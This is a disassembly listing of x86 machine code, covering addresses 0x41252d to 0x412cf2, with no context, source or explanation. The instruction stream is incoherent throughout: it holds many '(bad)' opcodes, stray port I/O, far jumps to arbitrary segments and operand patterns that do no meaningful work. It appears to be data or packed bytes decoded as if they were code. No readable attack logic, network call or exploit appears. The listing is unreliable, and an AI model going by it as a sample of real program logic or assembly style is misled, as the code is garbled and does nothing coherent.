  41252d:	jp     0x412534
  41252f:	mov    dh,0x6d
  412531:	leave  
  412532:	or     ch,BYTE PTR [esi-0xcbf5d59]
  412538:	dec    eax
  412539:	xchg   esi,eax
  41253a:	jge    0x4125ba
  41253c:	fidivr DWORD PTR [ecx]
  41253e:	mov    ah,0x9
  412540:	ins    BYTE PTR es:[edi],dx
  412541:	test   eax,0xb8d10337
  412546:	jg     0x41259b
  412548:	xchg   ecx,eax
  412549:	xor    DWORD PTR [esi],edx
  41254b:	mov    ebp,0xd6859bcc
  412550:	mov    ecx,DWORD PTR [ebx]
  412552:	test   al,0xb4
  412554:	pop    ebx
  412555:	(bad)  
  412556:	sbb    dl,BYTE PTR [esi+0x66]
  412559:	test   bh,dl
  41255b:	shl    DWORD PTR [eax],0xf7
  41255e:	repz ja 0x412514
  412561:	mov    cl,0x6b
  412563:	inc    edx
  412564:	push   ebp
  412565:	leave  
  412566:	add    DWORD PTR [edx-0x45],ebp
  412569:	(bad)  
  41256a:	mov    edx,0xf4fdcb6
  41256f:	cmp    bl,dl
  412571:	loopne 0x4125b0
  412573:	(bad)  
  412574:	clc    
  412575:	repnz pop ebx
  412577:	push   edx
  412578:	lods   al,BYTE PTR ds:[esi]
  412579:	xor    al,bl
  41257b:	arpl   WORD PTR [eax+eiz*8],si
  41257e:	int3   
  41257f:	(bad)  
  412581:	xor    DWORD PTR [edi],0x29094a1
  412587:	(bad)  
  412588:	dec    BYTE PTR [ebx-0x54de791]
  41258e:	ja     0x41255a
  412590:	dec    edx
  412591:	mov    WORD PTR [ebx+0x2f],ss
  412594:	test   eax,0x8305938f
  412599:	pop    ebx
  41259a:	adc    dh,BYTE PTR [ebp-0x5a]
  41259d:	pop    ebp
  41259e:	jle    0x4125d4
  4125a0:	in     eax,dx
  4125a1:	cmp    BYTE PTR [edi+0x43efdb93],ch
  4125a7:	jno    0x41252b
  4125a9:	sbb    bl,0xfc
  4125ac:	push   cs
  4125ad:	adc    ch,cl
  4125af:	xlat   BYTE PTR ds:[ebx]
  4125b0:	dec    BYTE PTR [ecx+0x956a34f]
  4125b6:	loopne 0x4125dd
  4125b8:	dec    edx
  4125b9:	pusha  
  4125ba:	sub    BYTE PTR [edi-0x429c344d],al
  4125c0:	jecxz  0x412545
  4125c2:	dec    ebp
  4125c3:	sbb    al,0x23
  4125c5:	repz sub ecx,DWORD PTR [edi+0x49]
  4125c9:	push   edi
  4125ca:	into   
  4125cb:	push   esi
  4125cc:	ret    
  4125cd:	rcl    BYTE PTR [eax],1
  4125cf:	jns    0x412643
  4125d1:	mov    ebx,0x17588b16
  4125d6:	ss xchg edi,eax
  4125d8:	mov    ah,0xd9
  4125da:	out    0xef,eax
  4125dc:	in     al,0x4c
  4125de:	push   edx
  4125df:	dec    ebp
  4125e0:	jecxz  0x41259e
  4125e2:	and    BYTE PTR [edx+0x6bfaeaf9],ch
  4125e8:	call   0xe79d8be4
  4125ed:	xor    eax,0xcb99c819
  4125f2:	sub    BYTE PTR [ebp+eax*8-0x63],0x5f
  4125f7:	ss ins DWORD PTR es:[edi],dx
  4125f9:	inc    esp
  4125fa:	in     eax,dx
  4125fb:	xor    ebx,DWORD PTR [ecx+edi*8+0x28ea7489]
  412602:	xor    al,BYTE PTR [edi-0x18]
  412605:	pop    edi
  412606:	jg     0x4125aa
  412608:	xlat   BYTE PTR ds:[ebx]
  412609:	out    0x65,eax
  41260b:	in     al,dx
  41260c:	repz cli 
  41260e:	pop    ds
  41260f:	mov    al,ds:0x8d518907
  412614:	enter  0x3bf4,0x99
  412618:	in     eax,dx
  412619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41261a:	out    dx,eax
  41261b:	cmc    
  41261c:	jle    0x41266b
  41261e:	push   esp
  41261f:	jns    0x412682
  412621:	rol    BYTE PTR [ebx],1
  412623:	shl    ebp,0x56
  412626:	pop    es
  412627:	stos   BYTE PTR es:[edi],al
  412628:	out    0xd7,al
  41262a:	out    0xc2,al
  41262c:	jl     0x4125ea
  41262e:	xchg   BYTE PTR [edx],bh
  412630:	outs   dx,DWORD PTR ds:[esi]
  412631:	pusha  
  412632:	(bad)  
  412633:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412634:	sub    DWORD PTR [edi+0x1c],esi
  412637:	pop    ebx
  412638:	sbb    BYTE PTR [ebx+0x16],0xcd
  41263c:	not    BYTE PTR [ecx-0x1a]
  41263f:	add    ah,BYTE PTR [ebp+0x2468bd3f]
  412645:	adc    al,0x58
  412647:	xor    eax,0x8e01b810
  41264c:	lods   al,BYTE PTR ds:[esi]
  41264d:	push   ds
  41264e:	adc    al,0x94
  412650:	mov    bh,0xa4
  412652:	jmp    0xac1c141c
  412657:	leave  
  412658:	loopne 0x4126c7
  41265a:	aad    0xe
  41265c:	shl    BYTE PTR [ebx-0x64],1
  41265f:	nop
  412660:	cwde   
  412661:	out    dx,al
  412662:	jle    0x4126cf
  412664:	mov    al,ds:0x6eebd7b7
  412669:	fwait
  41266a:	in     al,dx
  41266b:	rcl    DWORD PTR fs:[ebp-0x4b619e0f],cl
  412672:	xor    BYTE PTR [edi+0xd],bh
  412675:	rcr    DWORD PTR [esi],cl
  412677:	cld    
  412678:	sbb    eax,0xb9d9244f
  41267d:	stos   DWORD PTR es:[edi],eax
  41267e:	jmp    0xb669:0xe8b40d2e
  412685:	push   esi
  412686:	pop    ss
  412687:	jmp    0x93ea:0x71668d56
  41268e:	lods   al,BYTE PTR ds:[esi]
  41268f:	push   cs
  412690:	pop    edi
  412691:	aas    
  412692:	xor    bh,BYTE PTR ss:[ebx+eiz*8-0x5]
  412697:	xor    esp,DWORD PTR [esi]
  412699:	jmp    0xcca689c0
  41269e:	and    dl,BYTE PTR [ebp-0x2365802d]
  4126a4:	not    BYTE PTR [esi-0x7b6fc53f]
  4126aa:	add    edx,0xf6889332
  4126b0:	xchg   esi,eax
  4126b1:	jbe    0x412645
  4126b3:	sbb    edi,DWORD PTR [ebx-0x4335b883]
  4126b9:	xor    dh,0x8b
  4126bc:	inc    eax
  4126bd:	and    edi,DWORD PTR [ecx+0x5e]
  4126c0:	out    0x68,eax
  4126c2:	jmp    0x5284:0x78783888
  4126c9:	adc    ch,ch
  4126cb:	adc    bh,cl
  4126cd:	sub    eax,0x8a989a6
  4126d2:	xor    DWORD PTR [ebp+0x318b43ac],0xffffffe4
  4126d9:	or     eax,0x664f343f
  4126de:	pushf  
  4126df:	jb     0x41273d
  4126e1:	push   cs
  4126e2:	push   cs
  4126e3:	sub    al,0x20
  4126e5:	lock out 0xc6,al
  4126e8:	retf   
  4126e9:	push   es
  4126ea:	push   ebp
  4126eb:	loop   0x4126d3
  4126ed:	stos   DWORD PTR es:[edi],eax
  4126ee:	push   0x68
  4126f0:	das    
  4126f1:	gs pop ebx
  4126f3:	and    BYTE PTR [edx+0x16],dl
  4126f6:	cmp    bl,bl
  4126f8:	mov    ds:0x3b84f259,al
  4126fd:	bound  edx,QWORD PTR [ecx-0x1ae43f00]
  412703:	jo     0x4126a4
  412705:	push   ds
  412706:	pop    ebx
  412707:	jecxz  0x4126be
  412709:	sbb    BYTE PTR [ebx],ah
  41270b:	jge    0x412763
  41270d:	sbb    al,0x2d
  41270f:	mov    bh,0x4
  412711:	cmc    
  412712:	das    
  412713:	pop    ebx
  412714:	inc    edi
  412715:	cmp    DWORD PTR [edi+0x2062d685],0x2d
  41271c:	xchg   esp,eax
  41271d:	cmp    al,0x69
  41271f:	mov    ss,ebp
  412721:	jmp    0xd32c:0xa9ef4d55
  412728:	pusha  
  412729:	pop    esp
  41272a:	push   0x1454d291
  41272f:	cmp    eax,0x9ad9cf35
  412734:	jle    0x4126c4
  412736:	add    dh,BYTE PTR [esi+ebx*8]
  412739:	pop    edi
  41273a:	int3   
  41273b:	retf   0xd01c
  41273e:	sbb    ah,BYTE PTR [esi+ecx*1]
  412741:	shr    DWORD PTR [esi+ecx*8+0x7a],1
  412745:	pop    ebx
  412746:	or     eax,0x5ff1f24d
  41274b:	and    ah,BYTE PTR [edx+eax*4+0x49bebe03]
  412752:	pop    ss
  412753:	inc    ebx
  412754:	adc    al,0xc6
  412756:	cmp    ah,BYTE PTR [ecx+0x31349a9a]
  41275c:	add    DWORD PTR [esi+0x69],ecx
  41275f:	ror    ebp,0x77
  412762:	adc    DWORD PTR [edx-0xc],0xffffffea
  412766:	push   0xffffffe8
  412768:	pop    ebp
  412769:	sbb    ch,BYTE PTR [ecx+0x30]
  41276c:	arpl   di,sp
  41276e:	iret   
  41276f:	adc    eax,0xd0504a4a
  412774:	(bad)  
  412775:	adc    DWORD PTR [esi+0x737a99f],esp
  41277b:	dec    ebp
  41277c:	mov    ds:0x4849fb4b,eax
  412781:	lods   al,BYTE PTR ds:[esi]
  412782:	inc    ebp
  412783:	lods   al,BYTE PTR ds:[esi]
  412784:	jo     0x412801
  412786:	imul   edx
  412788:	mov    al,0x81
  41278a:	and    al,0x2e
  41278c:	push   ebx
  41278d:	dec    esp
  41278e:	adc    eax,0xc80739c8
  412793:	and    ebx,DWORD PTR [edi]
  412795:	pop    esi
  412796:	mov    ah,0xcb
  412798:	xchg   esi,eax
  412799:	lods   al,BYTE PTR ds:[esi]
  41279a:	(bad)
  41279d:	adc    eax,0x4230d899
  4127a2:	push   edi
  4127a3:	add    al,0x2e
  4127a5:	inc    edx
  4127a6:	lods   al,BYTE PTR ds:[esi]
  4127a7:	add    DWORD PTR [ecx],ebx
  4127a9:	cli    
  4127aa:	jb     0x4127a7
  4127ac:	mov    esi,DWORD PTR [edi-0x6179ff3c]
  4127b2:	fild   DWORD PTR fs:[ecx]
  4127b5:	int    0xd1
  4127b7:	add    dl,BYTE PTR [ecx+ebp*8]
  4127ba:	mov    dl,0x35
  4127bc:	cmp    DWORD PTR [esi-0x2a4135a3],edi
  4127c2:	dec    edi
  4127c3:	in     al,0x6e
  4127c5:	ins    DWORD PTR es:[edi],dx
  4127c6:	ins    DWORD PTR es:[edi],dx
  4127c7:	and    al,0x3a
  4127c9:	les    esp,FWORD PTR [edi+edi*1-0x32]
  4127cd:	bound  esp,QWORD PTR ss:[ecx+0x28]
  4127d1:	ficom  DWORD PTR [edi]
  4127d3:	pop    DWORD PTR [ecx-0x2]
  4127d6:	aam    0x15
  4127d8:	bound  esp,QWORD PTR [eax]
  4127da:	cmp    BYTE PTR [ebp+edx*1+0x31],bl
  4127de:	shr    BYTE PTR [ecx],0x67
  4127e1:	and    eax,0x7c5d63da
  4127e6:	cmc    
  4127e7:	pop    edx
  4127e8:	pop    esp
  4127e9:	pop    es
  4127ea:	pop    esi
  4127eb:	mov    esi,DWORD PTR [ebp+0x1]
  4127ee:	or     bl,bl
  4127f0:	rcl    DWORD PTR [ecx-0x65cdfe77],cl
  4127f6:	fld    QWORD PTR [di+0x5f]
  4127fa:	pop    ebx
  4127fb:	jmp    DWORD PTR [edx]
  4127fd:	fild   QWORD PTR [edi-0x6c]
  412800:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412802:	mov    ebx,DWORD PTR ds:0x8329e629
  412808:	cli    
  412809:	jg     0x412878
  41280b:	outs   dx,DWORD PTR ds:[esi]
  41280c:	jecxz  0x4127aa
  41280e:	sbb    eax,0xc6b8b06a
  412813:	mov    esi,0xd1379fc6
  412818:	fld    TBYTE PTR [ecx]
  41281a:	ficomp WORD PTR [esp+edi*2-0x4c6432bf]
  412821:	cmp    eax,0x7c188660
  412826:	dec    esi
  412827:	loop   0x41289a
  412829:	dec    ecx
  41282a:	xchg   DWORD PTR [ecx],edx
  41282c:	in     al,dx
  41282d:	cmp    eax,0xa6583c68
  412832:	cmp    al,0x27
  412834:	push   cs
  412835:	and    ch,bh
  412837:	or     DWORD PTR [ecx+0x4d],ebp
  41283a:	adc    al,0xdd
  41283c:	stos   DWORD PTR es:[edi],eax
  41283d:	adc    al,0x1a
  41283f:	sti    
  412840:	pusha  
  412841:	push   ds
  412842:	adc    BYTE PTR [edi-0x5fab0089],bh
  412848:	retf   0x1282
  41284b:	icebp  
  41284c:	lods   eax,DWORD PTR ds:[esi]
  41284d:	es mov ch,0xfc
  412850:	mov    bh,0xa3
  412852:	es inc ebp
  412854:	lds    esi,FWORD PTR [eax-0x4a817150]
  41285a:	sub    al,0xa7
  41285c:	add    ebp,DWORD PTR [edx-0x64]
  41285f:	repz mov ah,dl
  412862:	dec    ecx
  412863:	jne    0x4128ba
  412865:	les    ebp,FWORD PTR [edi]
  412867:	cmp    bl,0xf6
  41286a:	dec    ebp
  41286b:	iret   
  41286c:	jbe    0x41289d
  41286e:	push   es
  41286f:	loopne 0x412807
  412871:	mov    al,ds:0x82b6a52
  412876:	jnp    0x412812
  412878:	push   edx
  412879:	outs   dx,BYTE PTR ds:[esi]
  41287a:	call   0xbf50f32c
  41287f:	xor    eax,0x88793c91
  412884:	mov    ebp,0xfb3b9f31
  412889:	sbb    bl,BYTE PTR [eax+0x4d]
  41288c:	dec    ebp
  41288d:	lock ins BYTE PTR es:[edi],dx
  41288f:	push   edx
  412890:	leave  
  412891:	rcl    ch,1
  412893:	aas    
  412894:	pop    esp
  412895:	sub    ecx,DWORD PTR [esi]
  412897:	push   0x2
  412899:	mov    ebx,0xc1b6fb3
  41289e:	mov    bh,0x43
  4128a0:	cmp    edx,ecx
  4128a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128a3:	mov    edx,0x6a36b117
  4128a8:	sub    DWORD PTR [ebx-0x4b8c63f4],ebp
  4128ae:	or     dh,BYTE PTR ds:0x5e231daa
  4128b4:	sbb    bl,BYTE PTR [ecx]
  4128b6:	push   esi
  4128b7:	dec    ecx
  4128b8:	and    eax,ebp
  4128ba:	push   ecx
  4128bb:	push   0xffffffd0
  4128bd:	or     ax,WORD PTR ds:[eax-0x5]
  4128c2:	push   edi
  4128c3:	or     DWORD PTR [eax+0x1beac2e5],0x89562d22
  4128cd:	inc    ecx
  4128ce:	lea    esi,[eax-0x945ca65]
  4128d4:	mov    bh,0x8c
  4128d6:	pop    eax
  4128d7:	out    dx,al
  4128d8:	add    al,0xd5
  4128da:	or     eax,0x7f196f34
  4128df:	lds    esi,FWORD PTR [edx]
  4128e1:	and    ecx,DWORD PTR [eax]
  4128e3:	in     al,dx
  4128e4:	sub    al,0xb4
  4128e6:	std    
  4128e7:	mov    ch,0xe7
  4128e9:	imul   ebp,DWORD PTR [esp+eax*1+0x63be78bf],0xffffffad
  4128f1:	(bad)  
  4128f2:	ffreep st(3)
  4128f4:	push   esp
  4128f5:	xor    ecx,DWORD PTR [ebp-0x70]
  4128f8:	sti    
  4128f9:	xchg   esi,eax
  4128fa:	shl    BYTE PTR [eax-0x545a118],1
  412900:	(bad)
  412903:	pop    esp
  412904:	retf   
  412905:	mov    esi,0x5d2d7dfe
  41290a:	pusha  
  41290b:	mov    bl,0xac
  41290d:	dec    edi
  41290e:	loopne 0x412987
  412910:	inc    edi
  412911:	adc    al,0x2f
  412913:	push   ebx
  412914:	mov    ds:0xa18ffec6,al
  412919:	fs sub edi,esp
  41291c:	mov    eax,ds:0xe37b7cae
  412921:	fistp  WORD PTR ds:0x3d9a5c0f
  412927:	ret    0x6487
  41292a:	outs   dx,BYTE PTR ds:[esi]
  41292b:	mov    cl,0x41
  41292d:	xor    esp,DWORD PTR [edi+ebp*2]
  412930:	imul   edi,DWORD PTR [edi-0x22],0xbf5326bf
  412937:	scas   al,BYTE PTR es:[edi]
  412938:	bound  ebx,QWORD PTR [ecx-0x78125013]
  41293e:	leave  
  41293f:	fwait
  412940:	mov    esi,0x728149e8
  412945:	fldenv ds:0x2168b0c9
  41294b:	(bad)  
  41294c:	sbb    al,0xa4
  41294e:	and    bh,BYTE PTR [eax+edx*8]
  412951:	adc    al,0x66
  412953:	aas    
  412954:	aam    0x5e
  412956:	xchg   edx,eax
  412957:	pop    ecx
  412958:	test   DWORD PTR [edx+ebp*4],ebx
  41295b:	iret   
  41295c:	sbb    DWORD PTR [ecx],ecx
  41295e:	xchg   bx,ax
  412960:	and    ecx,DWORD PTR [edx+0x198fd3a7]
  412966:	mov    es,WORD PTR [eax-0x2a]
  412969:	fwait
  41296a:	stos   BYTE PTR es:[edi],al
  41296b:	in     al,0x27
  41296d:	push   0xffffffd9
  41296f:	daa    
  412970:	and    al,0x27
  412972:	popa   
  412973:	shl    DWORD PTR [eax+ebp*4-0x34],1
  412977:	lds    eax,FWORD PTR [ebp+0x365df749]
  41297d:	cli    
  41297e:	dec    ebp
  41297f:	loope  0x4129a9
  412981:	outs   dx,BYTE PTR ds:[esi]
  412982:	jl     0x4129c5
  412984:	sar    DWORD PTR [esi+0x7e832e98],0xc3
  41298b:	or     BYTE PTR [ebx+edx*1+0x4380fca5],bh
  412992:	(bad)  
  412993:	pop    esp
  412994:	out    0x94,eax
  412996:	cs pop edi
  412998:	mov    esp,0xb15bbc55
  41299d:	retf   
  41299e:	adc    DWORD PTR [si-0x7c],0x2e09f2c3
  4129a6:	fcom   DWORD PTR [eax+ebp*8]
  4129a9:	ror    BYTE PTR [esi+0x34],1
  4129ac:	adc    DWORD PTR [edi-0x488f0ddd],edi
  4129b2:	jg     0x4129f5
  4129b4:	jo     0x4129a0
  4129b6:	cld    
  4129b7:	dec    ebx
  4129b8:	adc    al,BYTE PTR [ebp+0x2b58af50]
  4129be:	add    BYTE PTR [edi-0x1b],ch
  4129c1:	pop    ss
  4129c2:	inc    ebp
  4129c3:	mov    ebp,DWORD PTR [ecx+0x1532b75f]
  4129c9:	fwait
  4129ca:	add    BYTE PTR [ebx+ecx*1+0x6406f25f],bh
  4129d1:	and    DWORD PTR [ecx],edi
  4129d3:	adc    ecx,ebp
  4129d5:	pop    ss
  4129d6:	daa    
  4129d7:	dec    eax
  4129d8:	lock int 0xcd
  4129db:	mov    ecx,0xd3c24a33
  4129e0:	cs jae 0x412986
  4129e3:	std    
  4129e4:	sbb    eax,0x4aa2a434
  4129e9:	lods   al,BYTE PTR ds:[esi]
  4129ea:	jmp    0x4129dc
  4129ec:	mov    esp,0x4d1219e2
  4129f1:	sbb    cl,dh
  4129f3:	scas   eax,DWORD PTR es:[edi]
  4129f4:	xlat   BYTE PTR ds:[ebx]
  4129f5:	leave  
  4129f6:	jp     0x412983
  4129f8:	pop    esi
  4129f9:	push   0xc394eb8
  4129fe:	jle    0x412998
  412a00:	fld    DWORD PTR [esi+0x2]
  412a03:	enter  0xe6b9,0xaa
  412a07:	xor    esi,DWORD PTR [eax-0x6e]
  412a0a:	pusha  
  412a0b:	popa   
  412a0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a0d:	out    0xde,eax
  412a0f:	push   ebx
  412a10:	bound  ebp,QWORD PTR [eax+edx*4]
  412a13:	retf   0x7d86
  412a16:	sub    esp,DWORD PTR [esi]
  412a18:	call   0x3069:0xe7b7ed52
  412a1f:	(bad)  
  412a21:	mov    esp,0xb5bcf4a4
  412a26:	jbe    0x4129e0
  412a28:	loopne 0x412a09
  412a2a:	in     al,0x7f
  412a2c:	and    BYTE PTR [edi+0x2f],bl
  412a2f:	dec    eax
  412a30:	dec    ebp
  412a31:	mov    bl,0x89
  412a33:	jp     0x412a33
  412a35:	xor    eax,0xf192a3ad
  412a3a:	ret    0x648e
  412a3d:	jno    0x412a46
  412a3f:	cdq    
  412a40:	xstore-rng (bad)
  412a41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a42:	add    BYTE PTR [esi+0x5e],dh
  412a45:	mov    BYTE PTR [ecx-0x40],ch
  412a48:	mov    BYTE PTR [ebp+eiz*4+0x35],dh
  412a4c:	push   edx
  412a4d:	out    dx,al
  412a4e:	xor    DWORD PTR [eax+0x656f94d7],eax
  412a54:	push   ss
  412a55:	das    
  412a56:	test   DWORD PTR [edi+eiz*1-0x4353b085],ecx
  412a5d:	adc    DWORD PTR [edx+0x3f6fda81],ebx
  412a63:	xor    al,0xa4
  412a65:	sbb    al,0x63
  412a67:	lahf   
  412a68:	cmp    ebp,esi
  412a6a:	mov    dl,0x59
  412a6c:	or     al,0xbf
  412a6e:	ror    DWORD PTR [ecx+0x4a],1
  412a71:	sbb    BYTE PTR [eax-0x32e430a9],0x86
  412a78:	gs aad 0x5f
  412a7b:	jns    0x412a3e
  412a7d:	ror    DWORD PTR [ebx+0x490a818c],0xd4
  412a84:	pop    ebp
  412a85:	add    dh,BYTE PTR [ebp-0x71]
  412a88:	and    eax,0xc4460d8
  412a8d:	inc    ebp
  412a8e:	jb     0x412afc
  412a90:	imul   esi,DWORD PTR [ecx],0xffffff8f
  412a93:	addr16 mov eax,ds:0x8a36
  412a97:	(bad)  
  412a99:	fistp  QWORD PTR [ebp-0x2a]
  412a9c:	das    
  412a9d:	push   0x66
  412a9f:	sub    BYTE PTR [ebx],0x22
  412aa2:	in     eax,dx
  412aa3:	(bad)  
  412aa4:	sahf   
  412aa5:	mov    bl,0x74
  412aa7:	pop    ebp
  412aa8:	sbb    DWORD PTR [ebx+0x74765d57],esp
  412aae:	xchg   DWORD PTR [edx],ebp
  412ab0:	rol    ah,cl
  412ab2:	and    eax,0x837d7198
  412ab7:	dec    ebp
  412ab8:	test   BYTE PTR [ecx],0x68
  412abb:	ds nop
  412abd:	pop    ebx
  412abe:	pop    esi
  412abf:	push   esp
  412ac0:	jnp    0x412b0b
  412ac2:	jmp    0xd7cef367
  412ac7:	mov    ebx,ebp
  412ac9:	mov    dh,0xc8
  412acb:	enter  0x61d3,0x2e
  412acf:	xor    esi,esp
  412ad1:	pop    ds
  412ad2:	sbb    dh,BYTE PTR [esi]
  412ad4:	mov    edx,0x21eeb2c1
  412ad9:	xchg   ebx,eax
  412ada:	inc    edx
  412adb:	cmp    DWORD PTR [eax+0x14d3e7d5],ecx
  412ae1:	sub    ah,BYTE PTR [edx-0xa458d14]
  412ae7:	add    al,0xaa
  412ae9:	cmp    bl,BYTE PTR [edi+0x7cc9b33]
  412aef:	mov    al,0x98
  412af1:	mov    ah,0x56
  412af3:	jl     0x412ab9
  412af5:	gs cwde 
  412af7:	push   ebp
  412af8:	stos   BYTE PTR es:[edi],al
  412af9:	fild   QWORD PTR [eax-0x80]
  412afc:	and    al,0x30
  412afe:	(bad)  [ebx-0x7a05b4ed]
  412b04:	and    esi,edi
  412b06:	push   ebx
  412b07:	inc    edx
  412b08:	test   DWORD PTR [edx],ebp
  412b0a:	lods   al,BYTE PTR ds:[esi]
  412b0b:	sub    ecx,DWORD PTR [ebp-0x3fe9cff8]
  412b11:	add    eax,0xcc8e3d0
  412b16:	mov    ch,0x56
  412b18:	cdq    
  412b19:	mov    ebp,DWORD PTR [edx-0x61]
  412b1c:	mov    ecx,0xf4e51fe9
  412b21:	push   DWORD PTR [ebp+0x301d245f]
  412b27:	mov    edx,0x6bbe859b
  412b2c:	je     0x412ba8
  412b2e:	add    eax,DWORD PTR [esi]
  412b30:	pushf  
  412b31:	call   0x8513:0x186c490b
  412b38:	enter  0x8a14,0xce
  412b3c:	xlat   BYTE PTR ds:[ebx]
  412b3d:	and    DWORD PTR [edi+0x78487caf],esp
  412b43:	xchg   ebx,eax
  412b44:	bound  edi,QWORD PTR [edx+eiz*1-0x29e6a47d]
  412b4b:	inc    ebp
  412b4c:	dec    ebp
  412b4d:	rcr    ebp,0x41
  412b50:	shl    BYTE PTR [esi+0x549d07],1
  412b56:	fdiv   st(5),st
  412b58:	icebp  
  412b59:	mov    ebx,0xf7f5a317
  412b5e:	rcl    esp,1
  412b60:	and    al,0xeb
  412b62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b63:	xor    cl,al
  412b65:	pusha  
  412b66:	cwde   
  412b67:	setl   BYTE PTR [eax]
  412b6a:	out    dx,eax
  412b6b:	sub    eax,ebp
  412b6d:	inc    esp
  412b6e:	jmp    0x7a7:0xb9db5d2c
  412b75:	adc    eax,0x37aaa27f
  412b7a:	sub    eax,DWORD PTR [ecx]
  412b7c:	adc    DWORD PTR [edi+0x66f47c99],esp
  412b82:	push   esi
  412b83:	pop    ss
  412b84:	xor    DWORD PTR [edx+0x43ba6048],ebx
  412b8a:	loope  0x412b67
  412b8c:	push   esi
  412b8d:	xor    esi,eax
  412b8f:	xor    DWORD PTR [edi],eax
  412b91:	adc    ah,ah
  412b93:	stos   DWORD PTR es:[edi],eax
  412b94:	punpcklbw mm6,mm3
  412b97:	daa    
  412b98:	loope  0x412bd6
  412b9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b9b:	mov    esp,0xabb261f
  412ba0:	scas   al,BYTE PTR es:[edi]
  412ba1:	dec    ebx
  412ba2:	xor    al,0xe7
  412ba4:	mov    WORD PTR [edi-0x357dc9ff],ss
  412baa:	gs mov dl,0xe0
  412bad:	inc    eax
  412bae:	out    0x5b,eax
  412bb0:	xchg   BYTE PTR [eax-0x62bb4fd1],ch
  412bb6:	pop    esp
  412bb7:	es fwait
  412bb9:	xchg   edx,eax
  412bba:	retf   
  412bbb:	push   edx
  412bbc:	loop   0x412bdd
  412bbe:	mov    eax,ds:0x9cba42ca
  412bc3:	pop    esp
  412bc4:	jno    0x412b53
  412bc6:	inc    ecx
  412bc7:	xchg   ebp,eax
  412bc8:	stc    
  412bc9:	shr    DWORD PTR [edx-0x54],0xbe
  412bcd:	jle    0x412b56
  412bcf:	sub    al,0x6e
  412bd1:	(bad)  
  412bd2:	fcomip st,st(4)
  412bd4:	mov    BYTE PTR [eax-0x5f388cb3],bh
  412bda:	lods   al,BYTE PTR ds:[esi]
  412bdb:	mov    dl,0xb2
  412bdd:	add    eax,0x4a1f14cb
  412be2:	and    esp,ebx
  412be4:	js     0x412c40
  412be6:	int3   
  412be7:	cwde   
  412be8:	sbb    DWORD PTR [esp+edi*1],0xa4a2c8db
  412bef:	in     eax,0x22
  412bf1:	sub    DWORD PTR [edx+0x53],esp
  412bf4:	pop    edi
  412bf5:	mov    ecx,0xaabd3ac7
  412bfa:	add    al,0xbb
  412bfc:	stc    
  412bfd:	int3   
  412bfe:	jno    0x412b94
  412c00:	xor    al,0x5c
  412c02:	mov    esp,0x21d74ee3
  412c07:	inc    esp
  412c08:	jne    0x412c2f
  412c0a:	stc    
  412c0b:	das    
  412c0c:	sub    eax,0xed0a1221
  412c11:	stos   DWORD PTR es:[edi],eax
  412c12:	cs jge 0x412bd3
  412c15:	inc    ebx
  412c16:	stos   BYTE PTR es:[edi],al
  412c17:	cwde   
  412c18:	pop    esp
  412c19:	dec    eax
  412c1a:	sbb    esi,0xa95114a0
  412c20:	push   ds
  412c21:	mov    eax,ds:0x14aa5019
  412c26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c27:	outs   dx,BYTE PTR ds:[esi]
  412c28:	les    ebx,FWORD PTR [ebp-0x4c5d5763]
  412c2e:	orps   xmm4,xmm7
  412c31:	rcr    BYTE PTR [ebx+0x1a],cl
  412c34:	js     0x412be5
  412c36:	pop    eax
  412c37:	mov    WORD PTR [ebp-0x20882da4],ds
  412c3d:	mov    cl,0x59
  412c3f:	xchg   ebx,eax
  412c40:	fsub   st(4),st
  412c42:	pop    es
  412c43:	push   cs
  412c44:	pop    es
  412c45:	pop    ebx
  412c46:	les    ecx,FWORD PTR [eax-0x64e55213]
  412c4c:	shl    esp,1
  412c4e:	rcr    BYTE PTR [edx],0x41
  412c51:	int    0x32
  412c53:	mov    dl,0xa6
  412c55:	popf   
  412c56:	xchg   ecx,eax
  412c57:	sbb    ebx,ebx
  412c59:	and    DWORD PTR [edx+0x9],0x6a7db9ac
  412c60:	fsubr  DWORD PTR [edx+0x4eac31f2]
  412c66:	push   ebx
  412c67:	into   
  412c68:	dec    edi
  412c69:	and    al,0xda
  412c6b:	shr    edi,0x51
  412c6e:	test   DWORD PTR [ebp+edi*8-0x47],esp
  412c72:	fcmovnu st,st(2)
  412c74:	mov    cl,0xac
  412c76:	in     eax,dx
  412c77:	mov    bh,0x37
  412c79:	dec    esp
  412c7a:	add    ah,BYTE PTR [esi+0xc038ab9]
  412c80:	dec    ebx
  412c81:	sub    eax,0xf79736df
  412c86:	mov    bh,0xdd
  412c88:	mov    BYTE PTR [eax],ch
  412c8a:	mov    dh,0x83
  412c8c:	imul   edx,DWORD PTR [ecx+0x30],0xffffffd6
  412c90:	cmp    al,0x8e
  412c92:	push   esp
  412c93:	stos   DWORD PTR es:[edi],eax
  412c94:	stc    
  412c95:	fnsave [edx]
  412c97:	jo     0x412d11
  412c99:	scas   eax,DWORD PTR es:[edi]
  412c9a:	inc    ebx
  412c9b:	(bad)  
  412c9c:	sbb    dh,ch
  412c9e:	mov    dl,0xe4
  412ca0:	and    eax,0xf8f8b731
  412ca5:	or     BYTE PTR [ebx-0x2c],0x7a
  412ca9:	sti    
  412caa:	sub    eax,0x316e4193
  412caf:	dec    ebp
  412cb0:	jmp    0x52:0x5f248291
  412cb7:	xchg   esi,eax
  412cb8:	(bad)  
  412cba:	or     DWORD PTR [ecx+0xf7ba9b6],0x6d5ea12
  412cc4:	adc    bh,ch
  412cc6:	xchg   esi,eax
  412cc7:	push   ebx
  412cc8:	jmp    0xa0bf:0xccd8f265
  412ccf:	dec    edi
  412cd0:	out    dx,al
  412cd1:	push   ecx
  412cd2:	ins    DWORD PTR es:[edi],dx
  412cd3:	sbb    BYTE PTR [ebx+0xf],ch
  412cd6:	hlt    
  412cd7:	repz or ebp,DWORD PTR [eax+edx*4+0x37cc3997]
  412cdf:	mov    eax,0xe8f5530d
  412ce4:	mov    ds:0x95074a68,eax
  412ce9:	mov    ebp,?
  412ceb:	inc    eax
  412cec:	cmp    DWORD PTR [edi-0x64],ebx
  412cef:	into   
  412cf0:	cwde   
  412cf1:	dec    edi
  412cf2:	push   esp
